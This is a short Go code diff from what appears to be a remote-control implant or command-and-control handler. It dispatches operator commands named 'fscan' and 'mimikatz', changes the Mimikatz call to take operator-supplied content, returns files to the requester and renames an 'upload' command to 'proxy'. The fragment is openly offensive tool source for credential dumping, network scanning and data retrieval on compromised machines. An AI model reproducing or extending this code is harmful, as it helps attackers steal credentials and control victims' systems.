@@ -79,7 +79,7 @@ func HandlePostJson(w http.ResponseWriter, r *http.Request) {
 			case "fscan":
 				Function.Fscan()
 			case "mimikatz":
-				Function.Mimikatz()
+				Function.Mimikatz(get_result.Content)
 			}
 
 		case "downloadjob":
@@ -98,7 +98,7 @@ func HandlePostJson(w http.ResponseWriter, r *http.Request) {
 			file.Seek(0, 0)
 			io.Copy(w, file)
 			fmt.Fprintf(w, `{"code":0}`)
-		case "upload":
+		case "proxy":
 		default:
 
 			files, err := ioutil.ReadDir(`Cache`)
